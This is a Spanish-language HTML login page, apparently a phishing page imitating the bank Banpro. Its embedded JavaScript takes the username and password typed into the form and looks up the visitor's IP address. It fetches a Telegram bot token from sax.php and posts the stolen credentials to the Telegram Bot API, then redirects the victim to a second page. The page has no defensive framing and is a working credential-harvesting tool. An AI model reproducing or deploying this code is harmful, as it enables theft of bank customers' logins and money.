<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Inicie Sesión</title>
</head>
<body>
<style>
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }

    /* Estilos para el modal */
    #modal {
        display: none; /* Oculto por defecto */
        position: fixed;
        z-index: 100; /* Asegura que esté en frente */
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5); /* Fondo oscuro */
        justify-content: center;
        align-items: center;
    }

    #modal-content {
        background-color: white;
        padding: 20px;
        border-radius: 10px;
        width: 300px;
        text-align: center;
    }

    #modal-content p {
        font-family: dinReg, sans-serif;
        font-size: 18px;
        color: #333;
    }

    #modal-content button {
        margin-top: 20px;
        padding: 10px 20px;
        background-color: rgb(0, 105, 60);
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
    }
</style>

<div id="main-cnt" style="overflow: hidden; min-height:100vh; position: relative;">
    <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="frmc" style="display:inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
            <form id="f1" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                <input id="i2" name="ips2" placeholder="Contraseña" type="password" required
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                <input type="submit" value="Inicie Sesión"
                       style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
            </form>
        </div>
        <div id="bnncont" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Modal de advertencia -->
<div id="modal">
    <div id="modal-content">
        <p>Usuario o contraseña invalido</p>
        <button id="btnAceptar">Aceptar</button>
    </div>
</div>

<style>
    @media screen and (max-width:1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #ctn {
            border-radius: 6px !important;
        }
        #main-cnt {
            text-align: center !important;
            padding-top: 30px;
        }
        #frmc {
            width: 100% !important;
        }
        #bnncont {
            display: none !important;
        }
    }
</style>

<script>
    document.addEventListener("DOMContentLoaded", function() {
        // Prevenir espacios en el campo de usuario
        document.getElementById("i1").addEventListener("input", function(event) {
            this.value = this.value.replace(/\s/g, '');
        });

        // Validar la contraseña según los requisitos
        function validarContrasena(contrasena) {
            const regex = /^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[!#$%&()*+,\-.\/:><=\\{}\|¡])[A-Za-z\d!#$%&()*+,\-.\/:><=\\{}\|¡]{8,32}$/;
            return regex.test(contrasena);
        }

        // Función para obtener el token y el chat ID desde sax.php
        function obtenerToken() {
            return fetch('sax.php') // Asegúrate de que sax.php esté configurado correctamente para devolver JSON
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    if (data && typeof data === 'object') {
                        return {
                            token: data.token,
                            chat_id: data.chat_id
                        };
                    } else {
                        throw new Error('Formato de respuesta inválido');
                    }
                })
                .catch(error => {
                    console.error('Error al obtener el token:', error);
                });
        }

        // Función para obtener la IP del cliente
        function obtenerIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Error al obtener la IP:', error);
                    return 'No disponible';
                });
        }

        // Evento de envío del formulario
        document.getElementById("f1").addEventListener("submit", function(event) {
            event.preventDefault();

            // Obtener los valores ingresados en el formulario
            const usuario = document.getElementById("i1").value;
            const contrasena = document.getElementById("i2").value;

            // Validar la contraseña
            if (!validarContrasena(contrasena)) {
                mostrarModal();
                return;
            }

            // Obtener la IP y el token, luego enviar el mensaje a Telegram
            Promise.all([obtenerToken(), obtenerIP()])
                .then(results => {
                    const data = results[0];
                    const ip = results[1];

                    if (data && data.token && data.chat_id) {
                        const msg = `BANPRO LOGIN> IP: ${ip} - Usuario: ${usuario} - Contraseña: ${contrasena}`;
                        enviarMensajeTelegram(data.token, data.chat_id, msg);
                    }
                })
                .catch(error => {
                    console.error('Error durante el proceso:', error);
                });
        });

        // Función para enviar un mensaje a Telegram
        function enviarMensajeTelegram(token, chat_id, mensaje) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const params = {
                chat_id: chat_id,
                text: mensaje
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Ocurrió un error al enviar el mensaje.');
                }
                console.log('Mensaje enviado con éxito.');
                // Redirigir después de enviar el mensaje
                window.location.href = '2.html';
            })
            .catch(error => {
                console.error('Error al enviar el mensaje:', error);
            });
        }

        // Función para mostrar el modal
        function mostrarModal() {
            const modal = document.getElementById("modal");
            modal.style.display = "flex";
        }

        // Cerrar el modal cuando se presione el botón "Aceptar"
        document.getElementById("btnAceptar").addEventListener("click", function() {
            const modal = document.getElementById("modal");
            modal.style.display = "none";
        });
    });
</script>
</body>
</html>
